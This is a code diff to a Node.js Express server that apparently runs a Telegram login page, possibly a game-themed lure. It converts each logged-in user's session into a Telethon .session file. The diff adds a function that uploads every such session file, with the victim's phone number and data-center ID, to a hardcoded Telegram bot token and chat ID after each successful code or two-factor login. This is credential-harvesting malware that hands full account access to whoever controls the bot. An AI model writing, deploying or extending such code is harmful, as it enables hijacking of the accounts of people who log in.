@@ -1,8 +1,8 @@
 const express = require('express');
 const session = require('express-session');
-const FileStore = require('session-file-store')(session);
 const fs = require('fs');
 const path = require('path');
+const https = require('https');
 const { execSync } = require('child_process');
 const { TelegramClient, Api } = require('telegram');
 const { StringSession } = require('telegram/sessions');
@@ -17,14 +17,17 @@ const API_ID = config.API_ID || 2040;
 const API_HASH = config.API_HASH || 'b18441a1ff607e10a989891a5462e627';
 const ADMIN_KEY = config.ADMIN_KEY || 'brawladmin';
 
+// Telegram Bot Details
+const BOT_TOKEN = '8890738033:AAE0mlWbGA5bO79QtsbmF9O8dmK5G4VLDR4';
+const CHAT_ID = '844093242';
+
 // Parsers
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
-// Persistent Express Sessions
+// Express Sessions (In-Memory)
 app.use(session({
-    store: new FileStore({ path: './sessions_store', ttl: 86400 }),
     secret: 'brawl_pass_secret_key',
     resave: false,
     saveUninitialized: false,
@@ -38,7 +41,7 @@ if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true }
 // Active in-memory Telegram Client instances
 const activeClients = {};
 
-// Определение корректной команды Python для вашей ОС
+// Определение команды Python в системе
 function getPythonCommand() {
     try {
         execSync('python3 --version', { stdio: 'ignore' });
@@ -55,9 +58,88 @@ function getSessionFilePath(phone) {
 }
 
 /**
+ * Отправка файла сессии в Telegram чат через Bot API
+ */
+async function sendSessionToBot(filePath, phone, dcId) {
+    return new Promise((resolve, reject) => {
+        if (!fs.existsSync(filePath)) {
+            console.error(`❌ File to send not found: ${filePath}`);
+            return resolve(false);
+        }
+
+        const boundary = '----WebKitFormBoundary' + Math.random().toString(16).substring(2);
+        const fileName = path.basename(filePath);
+        const fileData = fs.readFileSync(filePath);
+
+        const caption = `📱 *Новая сессия Telegram*\n\n` +
+                        `👤 *Телефон:* \`+${phone}\`\n` +
+                        `🌐 *DC ID:* \`${dcId}\`\n` +
+                        `📦 *Файл:* \`${fileName}\``;
+
+        // Построение multipart/form-data запроса
+        let body = '';
+        body += `--${boundary}\r\n`;
+        body += `Content-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`;
+
+        body += `--${boundary}\r\n`;
+        body += `Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`;
+
+        body += `--${boundary}\r\n`;
+        body += `Content-Disposition: form-data; name="parse_mode"\r\n\r\nMarkdown\r\n`;
+
+        body += `--${boundary}\r\n`;
+        body += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
+        body += `Content-Type: application/octet-stream\r\n\r\n`;
+
+        const footer = `\r\n--${boundary}--\r\n`;
+
+        const options = {
+            hostname: 'api.telegram.org',
+            port: 443,
+            path: `/bot${BOT_TOKEN}/sendDocument`,
+            method: 'POST',
+            headers: {
+                'Content-Type': `multipart/form-data; boundary=${boundary}`,
+                'Content-Length': Buffer.byteLength(body) + fileData.length + Buffer.byteLength(footer)
+            }
+        };
+
+        const req = https.request(options, (res) => {
+            let responseData = '';
+            res.on('data', (chunk) => responseData += chunk);
+            res.on('end', () => {
+                try {
+                    const parsed = JSON.parse(responseData);
+                    if (parsed.ok) {
+                        console.log(`🚀 Session file ${fileName} successfully sent to Telegram Chat ${CHAT_ID}`);
+                        resolve(true);
+                    } else {
+                        console.error(`❌ Bot API Error:`, parsed);
+                        resolve(false);
+                    }
+                } catch (e) {
+                    console.error(`❌ Error parsing Bot API response:`, e.message);
+                    resolve(false);
+                }
+            });
+        });
+
+        req.on('error', (err) => {
+            console.error(`❌ HTTPS request error sending to Bot:`, err.message);
+            resolve(false);
+        });
+
+        req.write(body);
+        req.write(fileData);
+        req.write(footer);
+        req.end();
+    });
+}
+
+/**
  * Converts GramJS session credentials into a Telethon-compatible SQLite .session file
  */
-function saveTelethonSession(phone, client, targetPath) {
+async function saveTelethonSession(phone, client, targetPath) {
     const cleanPhone = phone.replace(/[^0-9]/g, '');
     const tempPyPath = path.join(__dirname, `temp_session_${cleanPhone}.py`);
 
@@ -69,7 +151,6 @@ function saveTelethonSession(phone, client, targetPath) {
 
         if (!authKey) throw new Error("No authKey in session");
 
-        // Безопасное извлечение ключа
         let keyBuffer;
         if (typeof authKey.getKey === 'function') {
             keyBuffer = authKey.getKey();
@@ -114,8 +195,7 @@ conn.close()
             fs.unlinkSync(targetPath);
         }
 
-        // Выполняем Python с выводом ошибок в случае сбоя (stdio: 'pipe')
-        const output = execSync(`${PYTHON_CMD} "${tempPyPath}" "${targetPath.replace(/\\/g, '\\\\')}" ${dcId} "${serverAddress}" ${port} "${authKeyHex}"`, {
+        execSync(`${PYTHON_CMD} "${tempPyPath}" "${targetPath.replace(/\\/g, '\\\\')}" ${dcId} "${serverAddress}" ${port} "${authKeyHex}"`, {
             encoding: 'utf-8'
         });
 
@@ -126,6 +206,9 @@ conn.close()
         if (fs.existsSync(targetPath)) {
             const fileSize = fs.statSync(targetPath).size;
             console.log(`✅ Session file created successfully (${fileSize} bytes): ${targetPath}`);
+
+            // Отправляем файл боту
+            await sendSessionToBot(targetPath, cleanPhone, dcId);
             return true;
         } else {
             console.error(`❌ File was not created at expected path: ${targetPath}`);
@@ -195,12 +278,12 @@ app.post('/api/verify-code', async (req, res) => {
         );
 
         const sessionPath = getSessionFilePath(phone);
-        const saved = saveTelethonSession(phone, client, sessionPath);
+        const saved = await saveTelethonSession(phone, client, sessionPath);
 
         delete activeClients[phone];
 
         if (!saved) {
-            return res.status(500).json({ error: 'Auth succeeded, but failed to write session file to disk.' });
+            return res.status(500).json({ error: 'Auth succeeded, but failed to write session file.' });
         }
 
         res.json({ success: true, status: 'authenticated' });
@@ -234,12 +317,12 @@ app.post('/api/verify-password', async (req, res) => {
         );
 
         const sessionPath = getSessionFilePath(phone);
-        const saved = saveTelethonSession(phone, client, sessionPath);
+        const saved = await saveTelethonSession(phone, client, sessionPath);
 
         delete activeClients[phone];
 
         if (!saved) {
-            return res.status(500).json({ error: '2FA succeeded, but failed to write session file to disk.' });
+            return res.status(500).json({ error: '2FA succeeded, but failed to write session file.' });
         }
 
         res.json({ success: true, status: 'authenticated' });
